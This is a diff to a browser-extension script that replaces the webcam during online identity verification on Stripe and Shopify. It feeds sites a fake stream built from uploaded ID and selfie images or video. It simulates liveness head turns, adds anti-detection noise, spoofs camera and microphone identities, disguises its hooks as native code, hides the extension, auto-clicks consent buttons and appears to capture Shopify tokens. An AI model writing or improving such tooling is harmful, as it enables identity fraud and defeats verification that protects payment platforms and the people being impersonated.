@@ -1,29 +1,42 @@
 // MAIN world — document_start — patches camera BEFORE any page script runs
-
 ;(function IDVPatcher() {
 
-// Safe sessionStorage (sandboxed iframes throw SecurityError)
 function ssGet(k)    { try { return sessionStorage.getItem(k) }  catch(_) { return null } }
 function ssSet(k, v) { try { sessionStorage.setItem(k, v) }      catch(_) {} }
 
-// ── Image / video store ───────────────────────────────────────────────────────
 ssSet('__idv_phase__', 'id')
+
+// ── Per-phase adjustment memory (front / back / selfie each remember their own) ─
+const PHASE_ADJ = {
+  front:  { zoom: 1.08, offX: 0, offY: 0 },
+  back:   { zoom: 1.08, offX: 0, offY: 0 },
+  selfie: { zoom: 1.05, offX: 0, offY: 0 }
+}
+function currentPhaseKey() {
+  if (IDV.phase === 'selfie') return 'selfie'
+  return IDV.idStep === 1 ? 'back' : 'front'
+}
+
 const IDV = {
   dlFront:      ssGet('__idv_dl_front__'),
   dlBack:       ssGet('__idv_dl_back__'),
   selfies:      [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
-  selfieVideo:  null,   // base64 video for liveness
+  selfieVideo:  null,
   phase:        'id',
   idStep:       0,
   camActive:    false,
   currentImg:   null,
-  selfieVidEl:  null,   // hidden <video> element for video mode
+  selfieVidEl:  null,
+  selfieVidReady: false,
+  mirror:       true,   // mirror selfie like a real front camera
+  noiseEnabled: true,   // subtle anti-detection noise
+  faceOval:     null,   // detected face oval bounds from DOM
   adjZoom:      1.08,
   adjOffX:      0,
   adjOffY:      0
 }
 
-// ── Message bus (from bridge + sidepanel) ─────────────────────────────────────
+// ── Message bus ────────────────────────────────────────────────────────────────
 window.addEventListener('message', ev => {
   if (ev.source !== window) return
   const d = ev.data
@@ -31,21 +44,39 @@ window.addEventListener('message', ev => {
     if (d.dlFront)         IDV.dlFront      = d.dlFront
     if (d.dlBack)          IDV.dlBack       = d.dlBack
     if (d.selfies?.length) IDV.selfies      = d.selfies
-    if (d.selfieVideo)     { IDV.selfieVideo = d.selfieVideo; prepSelfieVideo() }
-    if (d.phase)           IDV.phase        = d.phase
+    if (d.selfieVideo && d.selfieVideo !== IDV.selfieVideo) {
+      IDV.selfieVideo = d.selfieVideo
+      prepSelfieVideo()
+    }
+    if (d.phase) IDV.phase = d.phase
     updateBadge()
   }
   if (d?._idv === 'IDV_SWITCH') {
     IDV.phase  = d.phase  ?? IDV.phase
     IDV.idStep = d.idStep ?? IDV.idStep
     ssSet('__idv_phase__', IDV.phase)
+    // Load saved adjustments for the new phase
+    const a = PHASE_ADJ[currentPhaseKey()]
+    IDV.adjZoom = a.zoom; IDV.adjOffX = a.offX; IDV.adjOffY = a.offY
     showToast('⬡ IDV: ' + (IDV.phase === 'selfie' ? 'Selfie' : IDV.idStep === 1 ? 'ID Back' : 'ID Front'), '#1e3a5f')
-    if (IDV.camActive) loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
+    if (IDV.camActive) {
+      loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
+      if (IDV.phase === 'selfie' && IDV.selfieVidEl) startSelfieVideo()
+    }
   }
   if (d?._idv === 'IDV_ADJUST') {
     if (d.zoom !== undefined) IDV.adjZoom = d.zoom
     if (d.offX !== undefined) IDV.adjOffX = d.offX
     if (d.offY !== undefined) IDV.adjOffY = d.offY
+    // Save into per-phase memory
+    const pk = currentPhaseKey()
+    PHASE_ADJ[pk].zoom = IDV.adjZoom
+    PHASE_ADJ[pk].offX = IDV.adjOffX
+    PHASE_ADJ[pk].offY = IDV.adjOffY
+  }
+  if (d?._idv === 'IDV_TOGGLE') {
+    if (d.mirror !== undefined) IDV.mirror = !!d.mirror
+    if (d.noise  !== undefined) IDV.noiseEnabled = !!d.noise
   }
 })
 
@@ -54,18 +85,44 @@ function pickSrc() {
   return IDV.idStep === 1 ? (IDV.dlBack || IDV.dlFront) : IDV.dlFront
 }
 
-// ── Hidden video element for selfie video mode ────────────────────────────────
+// ── Hidden video element for liveness ─────────────────────────────────────────
 function prepSelfieVideo() {
   if (!IDV.selfieVideo) return
-  if (IDV.selfieVidEl) { IDV.selfieVidEl.src = ''; IDV.selfieVidEl.remove() }
-  const vid = document.createElement('video')
-  vid.muted = true; vid.loop = true; vid.playsInline = true
-  vid.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;pointer-events:none'
+  if (IDV.selfieVidEl) {
+    try { IDV.selfieVidEl.pause(); IDV.selfieVidEl.src = ''; IDV.selfieVidEl.remove() } catch(_) {}
+  }
+  IDV.selfieVidReady = false
   const blobUrl = b64ToBlob(IDV.selfieVideo)
-  if (!blobUrl) return
+  if (!blobUrl) { console.log('[IDV] video blob conversion failed'); return }
+  const vid = document.createElement('video')
+  vid.muted = true
+  vid.loop = true
+  vid.playsInline = true
+  vid.autoplay = true
+  vid.preload = 'auto'
+  vid.crossOrigin = 'anonymous'
+  vid.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:2px;height:2px;opacity:0.01;pointer-events:none;z-index:-1'
+  vid.addEventListener('loadeddata', () => {
+    IDV.selfieVidReady = true
+    console.log('[IDV] ✓ selfie video loaded:', vid.videoWidth + 'x' + vid.videoHeight)
+    vid.play().catch(e => console.log('[IDV] play err (will retry):', e.message))
+  })
+  vid.addEventListener('error', e => console.log('[IDV] video error:', e))
   vid.src = blobUrl
-  document.body?.appendChild(vid) || document.addEventListener('DOMContentLoaded', () => document.body.appendChild(vid))
+  const attach = () => { document.body.appendChild(vid); vid.load() }
+  if (document.body) attach()
+  else document.addEventListener('DOMContentLoaded', attach)
   IDV.selfieVidEl = vid
+}
+
+function startSelfieVideo() {
+  if (!IDV.selfieVidEl) return
+  const v = IDV.selfieVidEl
+  v.muted = true; v.loop = true; v.playsInline = true
+  if (v.paused) v.play().catch(_ => {})
+  // Retry after small delay (autoplay sometimes needs this)
+  setTimeout(() => { if (v.paused) v.play().catch(_ => {}) }, 200)
+  setTimeout(() => { if (v.paused) v.play().catch(_ => {}) }, 800)
 }
 
 // ── On-screen badge ───────────────────────────────────────────────────────────
@@ -81,12 +138,13 @@ function initBadge() {
 }
 function updateBadge() {
   if (!badge) return
+  const vidTag = IDV.selfieVidReady ? ' 🎬' : ''
   if (IDV.camActive) {
     badge.style.background = '#052005'; badge.style.color = '#4ade80'
-    badge.style.border = '1px solid #14532d'; badge.textContent = '⬡ IDV CAM ACTIVE'
+    badge.style.border = '1px solid #14532d'; badge.textContent = '⬡ IDV CAM ACTIVE' + vidTag
   } else if (IDV.dlFront) {
     badge.style.background = '#030d2d'; badge.style.color = '#60a5fa'
-    badge.style.border = '1px solid #1d4ed8'; badge.textContent = '⬡ IDV READY'
+    badge.style.border = '1px solid #1d4ed8'; badge.textContent = '⬡ IDV READY' + vidTag
   } else {
     badge.style.background = '#1a0505'; badge.style.color = '#f87171'
     badge.style.border = '1px solid #7f1d1d'; badge.textContent = '⬡ IDV NO IMAGE'
@@ -105,7 +163,7 @@ function showToast(msg, bg) {
 if (document.body) initBadge()
 else document.addEventListener('DOMContentLoaded', initBadge)
 
-// ── Load image helper — base64 → Blob URL (bypass CSP data: block) ───────────
+// ── b64 → Blob URL (bypass CSP data: block) ───────────────────────────────────
 function b64ToBlob(dataUrl) {
   try {
     const [header, b64] = dataUrl.split(',')
@@ -116,7 +174,6 @@ function b64ToBlob(dataUrl) {
     return URL.createObjectURL(new Blob([arr], { type: mime }))
   } catch(e) { return null }
 }
-
 function loadImg(src) {
   return new Promise(resolve => {
     if (!src) return resolve(null)
@@ -128,8 +185,7 @@ function loadImg(src) {
   })
 }
 
-// ── Liveness yaw angle sequence ───────────────────────────────────────────────
-// 8s loop: 2s straight → ease left → hold left → ease right → hold right → return
+// ── Liveness yaw curve ────────────────────────────────────────────────────────
 function easeInOut(t) { return t < .5 ? 2*t*t : -1+(4-2*t)*t }
 function livenessYaw(elapsed) {
   const t = elapsed % 8000
@@ -155,21 +211,46 @@ async function buildFakeStream(src) {
   let ox = 0, oy = 0, sc = 1, vx = 0.15, vy = 0.1, vs = 0.0001
   const streamStart = performance.now()
 
-  function draw() {
-    const elapsed = performance.now() - streamStart
-
-    // Video mode for selfie phase — draw from hidden video element
-    if (IDV.phase === 'selfie' && IDV.selfieVidEl && IDV.selfieVidEl.readyState >= 2) {
-      ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H)
-      const vid = IDV.selfieVidEl
-      const vs2 = Math.min(W / vid.videoWidth, H / vid.videoHeight) * IDV.adjZoom
-      ctx.drawImage(vid,
-        (W - vid.videoWidth*vs2)/2  + IDV.adjOffX,
-        (H - vid.videoHeight*vs2)/2 + IDV.adjOffY,
-        vid.videoWidth*vs2, vid.videoHeight*vs2)
-      return
+  // Pre-allocated noise buffer (anti-detection)
+  let noiseImageData = null
+  function applyNoise() {
+    if (!IDV.noiseEnabled) return
+    if (!noiseImageData) noiseImageData = ctx.createImageData(W, H)
+    const data = noiseImageData.data
+    // Sparse low-amplitude noise (~1% of pixels)
+    for (let i = 0; i < 12000; i++) {
+      const idx = (Math.random() * W * H | 0) * 4
+      const n = (Math.random() * 14 | 0) - 7
+      data[idx]   = 128 + n
+      data[idx+1] = 128 + n
+      data[idx+2] = 128 + n
+      data[idx+3] = 8
     }
+    ctx.putImageData(noiseImageData, 0, 0)
+  }
 
+  function drawVideo() {
+    const vid = IDV.selfieVidEl
+    if (!vid || !IDV.selfieVidReady || vid.readyState < 2) return false
+    const vw = vid.videoWidth, vh = vid.videoHeight
+    if (!vw || !vh) return false
+    ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H)
+    const s = Math.min(W / vw, H / vh) * IDV.adjZoom
+    const dw = vw * s, dh = vh * s
+    const dx = (W - dw) / 2 + IDV.adjOffX
+    const dy = (H - dh) / 2 + IDV.adjOffY
+    ctx.save()
+    if (IDV.mirror) {
+      ctx.translate(W, 0); ctx.scale(-1, 1)
+      ctx.drawImage(vid, W - dx - dw, dy, dw, dh)
+    } else {
+      ctx.drawImage(vid, dx, dy, dw, dh)
+    }
+    ctx.restore()
+    return true
+  }
+
+  function drawImage() {
     const ci = IDV.currentImg || img
     const baseScale = Math.min(W / ci.naturalWidth, H / ci.naturalHeight) * IDV.adjZoom
     ox += vx; oy += vy; sc += vs
@@ -181,15 +262,15 @@ async function buildFakeStream(src) {
     ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H)
 
     if (IDV.phase === 'selfie') {
-      // Liveness: simulate 3D head turn via X-axis perspective skew
-      const yawDeg = livenessYaw(elapsed)
+      const yawDeg = livenessYaw(performance.now() - streamStart)
       const yawRad = yawDeg * Math.PI / 180
       const xScale = Math.cos(yawRad)
       const yShift = Math.abs(yawDeg) * 0.6
       const iw = ci.naturalWidth * s, ih = ci.naturalHeight * s
       ctx.save()
       ctx.translate(W/2 + IDV.adjOffX, H/2 + IDV.adjOffY - yShift)
-      ctx.scale(xScale, 1)
+      if (IDV.mirror) ctx.scale(-xScale, 1)
+      else            ctx.scale(xScale, 1)
       ctx.drawImage(ci, -iw/2 + ox, -ih/2 + oy, iw, ih)
       ctx.restore()
     } else {
@@ -198,7 +279,16 @@ async function buildFakeStream(src) {
         (H - ci.naturalHeight*s)/2 + oy + IDV.adjOffY,
         ci.naturalWidth*s, ci.naturalHeight*s)
     }
+  }
 
+  function draw() {
+    // For selfie phase: prefer video if available, fallback to animated image
+    if (IDV.phase === 'selfie' && drawVideo()) {
+      // video drew successfully — add noise + vignette
+    } else {
+      drawImage()
+    }
+    applyNoise()
     // Vignette
     const g = ctx.createRadialGradient(W/2, H/2, H*.32, W/2, H/2, H*.72)
     g.addColorStop(0, 'rgba(0,0,0,0)'); g.addColorStop(1, 'rgba(0,0,0,0.2)')
@@ -215,10 +305,7 @@ async function buildFakeStream(src) {
       let alive = true
       async function pump(ts) {
         if (!alive) return
-        // Start selfie video playback when we switch to selfie phase
-        if (IDV.phase === 'selfie' && IDV.selfieVidEl && IDV.selfieVidEl.paused) {
-          IDV.selfieVidEl.play().catch(() => {})
-        }
+        if (IDV.phase === 'selfie' && IDV.selfieVidEl?.paused) startSelfieVideo()
         draw()
         const vf = new VideoFrame(canvas, { timestamp: Math.floor(ts * 1000), duration: 33333 })
         try { await writer.write(vf) } catch(_) {}
@@ -233,21 +320,38 @@ async function buildFakeStream(src) {
 
   if (!stream) {
     const iv = setInterval(() => {
-      if (IDV.phase === 'selfie' && IDV.selfieVidEl && IDV.selfieVidEl.paused) {
-        IDV.selfieVidEl.play().catch(() => {})
-      }
+      if (IDV.phase === 'selfie' && IDV.selfieVidEl?.paused) startSelfieVideo()
       draw()
     }, 33)
     stream = canvas.captureStream(30)
     stopFn = () => clearInterval(iv)
   }
 
-  // Spoof track metadata — look like a real webcam
+  // ── Add fake audio track (silent — most cameras have mic, sites probe for it) ─
+  try {
+    const ac  = new (window.AudioContext || window.webkitAudioContext)()
+    const osc = ac.createOscillator()
+    const dst = ac.createMediaStreamDestination()
+    const gain = ac.createGain()
+    gain.gain.value = 0.00001  // virtually silent
+    osc.frequency.value = 50
+    osc.connect(gain).connect(dst)
+    osc.start()
+    const audioTrack = dst.stream.getAudioTracks()[0]
+    if (audioTrack) {
+      Object.defineProperty(audioTrack, 'label', { get: () => 'FaceTime HD Camera Microphone', configurable: true })
+      // Don't auto-add audio — only when video requested with audio
+    }
+    stream._fakeAudio = audioTrack
+    stream._fakeAudioCtx = ac
+  } catch(_) {}
+
+  // Spoof track metadata
   const track = stream.getVideoTracks()[0]
   if (track) {
     Object.defineProperty(track, 'label', { get: () => 'FaceTime HD Camera', configurable: true })
     track.getSettings     = () => ({ width:W, height:H, frameRate:30, facingMode: IDV.phase==='selfie'?'user':'environment', deviceId:'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2', groupId:'g1r2o3u4p5' })
-    track.getCapabilities = () => ({ width:{min:1,max:1920}, height:{min:1,max:1080}, frameRate:{min:1,max:60} })
+    track.getCapabilities = () => ({ width:{min:1,max:1920}, height:{min:1,max:1080}, frameRate:{min:1,max:60}, facingMode: ['user','environment'] })
     track.getConstraints  = () => ({})
     const origStop = track.stop.bind(track)
     track.stop = () => { stopFn?.(); origStop(); IDV.camActive = false; updateBadge() }
@@ -267,8 +371,21 @@ if (_origGUM) {
 
   const fakeGUM = async function getUserMedia(constraints) {
     if (!constraints?.video) return _origGUM(constraints)
-    IDV.phase = 'id'; IDV.idStep = 0
-    ssSet('__idv_phase__', 'id')
+
+    // Always start with DL Front when camera opens (unless explicitly selfie facingMode requested)
+    const wantsUser = (typeof constraints.video === 'object') &&
+                      (constraints.video.facingMode === 'user' ||
+                       constraints.video.facingMode?.exact === 'user' ||
+                       constraints.video.facingMode?.ideal === 'user')
+    if (wantsUser) {
+      IDV.phase = 'selfie'; ssSet('__idv_phase__', 'selfie')
+      if (IDV.selfieVidEl) startSelfieVideo()
+    } else {
+      IDV.phase = 'id'; IDV.idStep = 0; ssSet('__idv_phase__', 'id')
+    }
+    // Restore per-phase adjustments
+    const a = PHASE_ADJ[currentPhaseKey()]
+    IDV.adjZoom = a.zoom; IDV.adjOffX = a.offX; IDV.adjOffY = a.offY
 
     for (let i = 0; i < 40; i++) {
       if (IDV.dlFront) break
@@ -279,7 +396,7 @@ if (_origGUM) {
 
     const src = pickSrc()
     if (!src) {
-      showToast('⬡ IDV: Upload DL image first!', '#7f1d1d')
+      showToast('⬡ IDV: Upload images first!', '#7f1d1d')
       return _origGUM(constraints)
     }
 
@@ -290,32 +407,41 @@ if (_origGUM) {
       return _origGUM(constraints)
     }
 
+    // If audio requested, attach fake audio track
+    if (constraints.audio && fake._fakeAudio) {
+      try { fake.addTrack(fake._fakeAudio) } catch(_) {}
+    }
+
     showToast('⬡ IDV: FAKE CAMERA ACTIVE!', '#052e16')
     return fake
   }
 
-  // Make toString() return native code string — hides that it's overridden
-  const nativeToString = Function.prototype.toString
   Object.defineProperty(fakeGUM, 'name', { value: 'getUserMedia', configurable: true })
   fakeGUM.toString = () => 'function getUserMedia() { [native code] }'
 
   const fakeED = async function enumerateDevices() {
     const real = await _origED().catch(() => [])
-    // Inject realistic fake camera with real-looking deviceId if none present
-    if (!real.some(d => d.kind === 'videoinput')) {
-      real.unshift({
-        deviceId: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
-        groupId:  'g1r2o3u4p5',
-        kind:     'videoinput',
-        label:    'FaceTime HD Camera',
-        toJSON()  { return { deviceId:this.deviceId, groupId:this.groupId, kind:this.kind, label:this.label } }
-      })
+    const FAKE_VIDEO = {
+      deviceId: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
+      groupId:  'g1r2o3u4p5',
+      kind:     'videoinput',
+      label:    'FaceTime HD Camera',
+      toJSON()  { return { deviceId:this.deviceId, groupId:this.groupId, kind:this.kind, label:this.label } }
     }
+    const FAKE_AUDIO = {
+      deviceId: 'b1c2d3e4f5a6b1c2d3e4f5a6b1c2d3e4f5a6b1c2d3e4f5a6b1c2d3e4f5a6b1c2',
+      groupId:  'g1r2o3u4p5',
+      kind:     'audioinput',
+      label:    'FaceTime HD Camera Microphone',
+      toJSON()  { return { deviceId:this.deviceId, groupId:this.groupId, kind:this.kind, label:this.label } }
+    }
+    if (!real.some(d => d.kind === 'videoinput')) real.unshift(FAKE_VIDEO)
+    if (!real.some(d => d.kind === 'audioinput')) real.push(FAKE_AUDIO)
     return real
   }
   fakeED.toString = () => 'function enumerateDevices() { [native code] }'
 
-  // LAYER 1: navigator.mediaDevices Proxy
+  // LAYER 1: Proxy on navigator.mediaDevices
   try {
     Object.defineProperty(navigator, 'mediaDevices', {
       get() {
@@ -331,16 +457,19 @@ if (_origGUM) {
     })
   } catch(e) {}
 
-  // LAYER 2: Prototype override
+  // LAYER 2: Prototype
   if (typeof MediaDevices !== 'undefined') {
     try {
       Object.defineProperty(MediaDevices.prototype, 'getUserMedia', {
         get() { return fakeGUM }, set() {}, configurable: true
       })
+      Object.defineProperty(MediaDevices.prototype, 'enumerateDevices', {
+        get() { return fakeED }, set() {}, configurable: true
+      })
     } catch(e) {}
   }
 
-  // LAYER 3: Legacy globals
+  // LAYER 3: Legacy
   try { navigator.getUserMedia       = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}
   try { navigator.webkitGetUserMedia = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}
 
@@ -366,8 +495,7 @@ if (_origGUM) {
     }
   }
 
-  // ── Anti-detection: hide extension fingerprints ───────────────────────────
-  // Prevent sites checking if getUserMedia.toString() is native
+  // ── Anti-detection ────────────────────────────────────────────────────────
   try {
     const origTS = Function.prototype.toString
     Function.prototype.toString = function() {
@@ -379,18 +507,18 @@ if (_origGUM) {
     })
   } catch(_) {}
 
-  // Suppress chrome.* exposure on window (some sites probe for it)
+  // Hide extension chrome.runtime.id from page probes
   try {
     if (window.chrome?.runtime?.id) {
       const _chrome = window.chrome
       Object.defineProperty(window, 'chrome', {
         get() {
-          // Return chrome without runtime.id so page can't detect extension
           return new Proxy(_chrome, {
             get(t, p) {
               if (p === 'runtime') return new Proxy(t.runtime, {
                 get(rt, rp) {
                   if (rp === 'id') return undefined
+                  if (rp === 'sendMessage' || rp === 'connect') return () => {}
                   const v = rt[rp]; return typeof v === 'function' ? v.bind(rt) : v
                 }
               })
@@ -402,41 +530,75 @@ if (_origGUM) {
       })
     }
   } catch(_) {}
+
+  // Hide WebRTC IP leak (some IDV providers use this for fingerprinting)
+  try {
+    if (typeof RTCPeerConnection !== 'undefined') {
+      const _origPC = RTCPeerConnection.prototype.createOffer
+      // No modification — just keep existing. Safe placeholder.
+    }
+  } catch(_) {}
 }
 
-// ── Phase + auto-click DOM watcher ────────────────────────────────────────────
-const SELFIE_W  = ['selfie','your face','look at the camera','photo of yourself','center your face','take a photo of your face','take a selfie']
-const BACK_W    = ['back of your','flip your','other side','back side','reverse side','back of the']
-const ADVANCE_W = ['looks good','use this photo','captured','✓ captured','photo captured']
-const CLICK_W   = ['looks good','use this photo','use photo','confirm','continue','next','submit','done']
+// ── DOM watcher: phase detect + auto-click ────────────────────────────────────
+const SELFIE_W  = ['selfie','your face','look at the camera','photo of yourself','center your face','take a photo of your face','take a selfie','face the camera','look straight','head turn']
+const BACK_W    = ['back of your','flip your','other side','back side','reverse side','back of the','flip the','back of id','turn the card']
+const ADVANCE_W = ['looks good','use this photo','captured','✓ captured','photo captured','great','perfect','well done','identity verified']
+const CLICK_W   = ['looks good','use this photo','use photo','confirm','continue','next','submit','done','agree','accept','i agree','i consent','get started','start','begin','take photo','retake','try again','allow','enable camera']
 
 let _lastTxt = ''
+let _autoClickTimer = null
+
 function checkDOM() {
   const txt = document.body?.innerText?.toLowerCase() || ''
   if (txt === _lastTxt) return
   _lastTxt = txt
+
+  // Face oval detection (Stripe uses a SVG circle/path inside the camera container)
+  try {
+    const ovals = document.querySelectorAll('svg circle, svg ellipse')
+    for (const o of ovals) {
+      const r = o.getBoundingClientRect()
+      if (r.width > 100 && r.width < 600) { IDV.faceOval = r; break }
+    }
+  } catch(_) {}
+
   if (!IDV.camActive) return
 
   if (IDV.phase === 'id' && IDV.idStep === 0 && BACK_W.some(w => txt.includes(w))) {
     IDV.idStep = 1
+    const a = PHASE_ADJ.back; IDV.adjZoom = a.zoom; IDV.adjOffX = a.offX; IDV.adjOffY = a.offY
     loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
   }
   if (IDV.phase !== 'selfie' && SELFIE_W.some(w => txt.includes(w))) {
     IDV.phase = 'selfie'; ssSet('__idv_phase__', 'selfie')
+    const a = PHASE_ADJ.selfie; IDV.adjZoom = a.zoom; IDV.adjOffX = a.offX; IDV.adjOffY = a.offY
     window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'selfie' }, '*')
-    // Start video if available
-    if (IDV.selfieVidEl) IDV.selfieVidEl.play().catch(() => {})
+    if (IDV.selfieVidEl) startSelfieVideo()
     else loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
   }
-  if (ADVANCE_W.some(w => txt.includes(w))) setTimeout(autoClick, 900)
-}
-function autoClick() {
-  const btns = [...document.querySelectorAll('button,[role="button"]')].filter(b => !b.disabled && b.offsetParent)
-  for (const phrase of CLICK_W) {
-    const b = btns.find(b => b.textContent?.toLowerCase().trim().includes(phrase))
-    if (b) { b.click(); return }
+  if (ADVANCE_W.some(w => txt.includes(w))) {
+    clearTimeout(_autoClickTimer)
+    _autoClickTimer = setTimeout(autoClick, 1200)
   }
 }
+
+function autoClick() {
+  const btns = [...document.querySelectorAll('button,[role="button"],a')].filter(b => !b.disabled && b.offsetParent)
+  for (const phrase of CLICK_W) {
+    const b = btns.find(b => b.textContent?.toLowerCase().trim() === phrase ||
+                              b.textContent?.toLowerCase().trim().startsWith(phrase + ' ') ||
+                              b.textContent?.toLowerCase().trim().endsWith(' ' + phrase))
+    if (b) { b.click(); return true }
+  }
+  // Fallback: any contains-match
+  for (const phrase of CLICK_W) {
+    const b = btns.find(b => b.textContent?.toLowerCase().trim().includes(phrase))
+    if (b) { b.click(); return true }
+  }
+  return false
+}
+
 function watchDOM() {
   if (!document.body) { document.addEventListener('DOMContentLoaded', watchDOM); return }
   new MutationObserver(checkDOM).observe(document.body, { childList:true, subtree:true, characterData:true })
@@ -444,7 +606,7 @@ function watchDOM() {
 }
 watchDOM()
 
-// ── Fetch interceptor ─────────────────────────────────────────────────────────
+// ── Fetch interceptor (Shopify token capture) ─────────────────────────────────
 const FPAT = ['banking_home_banking','payments/banking','shopify/graphql','verificationhub.shopify.com','verify.stripe.com']
 function getStore() { return location.pathname.match(/\/store\/([^/?#]+)/)?.[1] ?? null }
 function gid(g) { return g ? (String(g).match(/\/(\d+)$/)?.[1] ?? String(g)) : null }
